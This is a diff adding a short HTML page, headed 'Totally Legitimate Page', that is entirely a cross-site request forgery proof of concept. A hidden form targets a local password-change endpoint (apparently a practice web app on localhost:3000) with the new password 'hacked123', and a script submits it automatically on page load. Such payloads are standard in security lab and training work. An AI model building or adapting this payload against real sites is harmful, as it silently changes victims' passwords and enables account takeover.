@@ -1,0 +1,13 @@
+<html>
+<body>
+<h1>Totally Legitimate Page</h1>
+<form id="attack" action="http://localhost:3000/rest/user/change-password" method="POST">
+  <input type="hidden" name="current" value="">
+  <input type="hidden" name="password" value="hacked123">
+  <input type="hidden" name="repeatPassword" value="hacked123">
+</form>
+<script>
+  document.getElementById("attack").submit();
+</script>
+</body>
+</html>
